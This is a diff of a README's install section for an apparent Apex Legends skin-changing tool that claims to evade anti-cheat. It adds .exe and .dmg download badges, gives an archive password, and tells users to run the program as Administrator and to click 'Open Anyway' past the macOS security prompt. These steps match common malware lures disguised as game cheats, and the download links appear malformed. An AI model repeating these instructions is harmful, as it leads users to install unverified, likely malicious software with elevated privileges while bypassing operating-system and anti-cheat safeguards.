@@ -54,15 +54,27 @@ Works because it never touches anything anti-cheat monitors.
 
 ## 📥 Install
 
-**Windows**
-1. Download → Extract → Run as Administrator
-2. Launch Apex Legends → pick skins → Apply
-3. Password for archive (if needed): `skins2026`
+### <img src="https://img.shields.io/badge/Windows-0078D6?style=flat-square&logo=windows&logoColor=white" /> Windows
 
-**macOS**
-1. Download `.dmg` → drag to Applications
-2. Security & Privacy → "Open Anyway" if prompted
-3. Launch Apex Legends → pick skins → Apply
+<a href="https://github.com/releases/download/latest/Skin_Change_Apex_Legends_Setup.exe">
+  <img src="https://img.shields.io/badge/⬇ Download%20.exe-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
+</a>
+
+1. Extract the archive &nbsp;*(password if needed: `skins2026`)*
+2. Right-click → **Run as Administrator**
+3. Launch Apex Legends → pick skins → **Apply**
+
+<br>
+
+### <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white" /> macOS
+
+<a href="https://github.com/releases/download/latest/Skin_Change_Apex_Legends.dmg">
+  <img src="https://img.shields.io/badge/⬇ Download%20.dmg-000000?style=for-the-badge&logo=apple&logoColor=white" />
+</a>
+
+1. Open `.dmg` → drag to **Applications**
+2. Security & Privacy → **"Open Anyway"** if prompted
+3. Launch Apex Legends → pick skins → **Apply**
 
 <br>
 
